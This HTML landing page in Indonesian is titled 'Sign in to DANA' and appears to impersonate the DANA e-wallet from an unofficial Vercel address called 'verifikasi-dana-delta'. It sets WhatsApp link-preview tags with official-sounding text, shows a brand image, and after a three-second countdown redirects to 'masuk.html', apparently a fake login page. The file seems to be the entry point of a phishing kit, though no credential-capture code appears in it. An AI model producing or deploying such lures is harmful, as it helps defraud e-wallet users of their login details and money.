<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke DANA</title>
    
    <!-- KODE AGAR TAMPILAN DI WHATSAPP LEBIH BAGUS -->
    <meta property="og:image" content="https://verifikasi-dana-delta.vercel.app/dana3.jpg" />
    <meta property="og:title" content="Verifikasi DANA" />
    <meta property="og:description" content="Mulai transaksi mudah dan aman dengan DANA, dompet digital terbaik untuk kebutuhan sehari-hari. Kirim uang, bayar QRIS, dan nikmati kemudahan transaksi ..." />
    <meta property="og:url" content="https://verifikasi-dana-delta.vercel.app/" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff; /* Ubah jadi putih biar pas */
        }

        /* ✅ PERBAIKAN UKURAN GAMBAR AGAR PAS */
        #gambarPembuka {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Gambar penuh pas layar, tidak terdistorsi */
            /* Kalau mau gambar utuh tidak terpotong, pakai ini: object-fit: contain; */
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

      
        }
    </style>
</head>
<body>

    <img id="gambarPembuka" src="dana.jpg" alt="DANA">
    <div id="timer">3</div>

    <script>
        let waktu = 3;
        let timerDisplay = document.getElementById('timer');
        
        let hitungMundur = setInterval(function() {
            waktu--;
            timerDisplay.textContent = waktu;
            
            if(waktu <= 0) {
                clearInterval(hitungMundur);
                // Pindah ke halaman masuk.html
                window.location.href = "masuk.html"; 
            }
        }, 1000);
    </script>

</body>
</html>
